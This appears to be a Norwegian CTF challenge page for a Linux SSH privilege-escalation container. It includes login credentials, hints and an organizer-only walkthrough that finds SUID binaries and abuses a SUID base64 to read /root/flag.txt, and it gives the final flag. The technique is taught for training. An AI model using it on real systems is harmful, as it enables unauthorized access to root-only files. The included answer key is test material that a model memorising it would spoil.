# Servicekontoen

**Kategori:** Linux
**Poeng:** 250
**Type:** Container (SSH Linux privilege escalation)
**Vanskelighetsgrad:** Medium
**Container:** 8 av 10

---

## Scenario

Nordverk har gitt deg tilgang til en låst servicekonto på en intern
Linux-server. Kontoen er ment for enkel feilsøking, men noen har vært litt
for generøse med filrettigheter på systemet.

Flagget ligger ikke i hjemmemappen din. Finn en klassisk Linux privilege
escalation og les filen som bare root egentlig skal kunne lese.

---

## Tilkobling

ssh ctfplayer@<IP> -p <PORT>
Passord: ICS_r0ck5!

---

## Flaggformat

CTF{...}

---

## Hints

| Kostnad | Hint |
|---------|------|
| 25 poeng | Ikke alle privilege escalations starter med `sudo -l`. Se etter SUID-filer. |
| 50 poeng | GTFOBins har egne oppskrifter for binærer med SUID-bit. |
| 75 poeng | Hvis et SUID-verktøy kan lese en vilkårlig fil, er `/root/flag.txt` et godt mål. |

---

## Løsningsvei (kun for arrangør)

1. Logg inn med SSH-informasjonen fra CTFd.
2. Sjekk hvem brukeren er:

   ```bash
   id
   ```

3. Se etter SUID-binærer:

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

4. Legg merke til at `/usr/bin/base64` har SUID-bit.
5. Slå opp `base64` på GTFOBins under SUID. Den kan brukes til å lese filer:

   ```bash
   base64 /root/flag.txt | base64 -d
   ```

**Flagg:** `CTF{suid_b4se64_reads_r00t}`
